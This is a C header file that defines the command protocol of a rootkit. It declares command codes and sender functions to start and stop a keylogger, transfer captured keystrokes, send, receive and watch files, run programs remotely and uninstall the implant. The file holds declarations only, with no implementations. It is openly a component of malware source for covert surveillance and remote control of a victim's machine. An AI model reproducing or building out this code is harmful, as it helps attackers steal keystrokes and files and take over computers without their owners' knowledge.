#ifndef ROOTKIT_PROTOCOL_H
#define ROOTKIT_PROTOCOL_H

#include "utils.h"
#include <stddef.h>
#include <stdint.h>

#define COMMAND_TRIGGER_THRESHOLD 2


enum command_codes {
    START_KEYLOGGER = 0x01,
    STOP_KEYLOGGER,
    KEY_LOG_TRANSFER,
    SEND_FILE,
    RECEIVE_FILE,
    SEND_WATCH,
    WATCH_CHANGED,
    RUN_PROGRAM,
    UNINSTALL,
    DISCONNECT,
    UNKNOWN
};

struct packet_data {
    uint16_t data;
    struct packet_data * next;
};

struct session_info {
    struct packet_data * head;
    int command_counter; // The number of times a command was encountered
    enum command_codes last_command_code;

    int packet_counter;
    int data_counter;

    _Atomic bool run_keylogger;
};

// Function typedef
typedef void (*command_handler)(struct session_info * session_info);

// Key Pair Object
typedef struct {
    int key;
    command_handler handler;
} key_pair;


//  Map of command codes and handler functions
// static const key_pair command_handler_functions[] = {
//     { START_KEYLOGGER,  start_keylogger },
//     { STOP_KEYLOGGER, stop_keylogger },
//     { RECEIVE_FILE, handle_receive_file },
//     { 0, NULL }
// };

// Keylogger
void send_start_keylogger(int fd);
void send_stop_keylogger(int fd);

// Disconnect
void send_disconnect(int fd);

// Transfer
enum FILE_TYPE {
    T_FILE,
    T_DIRECTORY
};

void send_file(struct server_options * server_options);
void receive_file(int fd);
void send_watch(int fd, enum FILE_TYPE file_type, char * path);


// Run program
void send_run_program(int fd);


// Uninstall
void send_uninstall(int fd);





#endif //ROOTKIT_PROTOCOL_H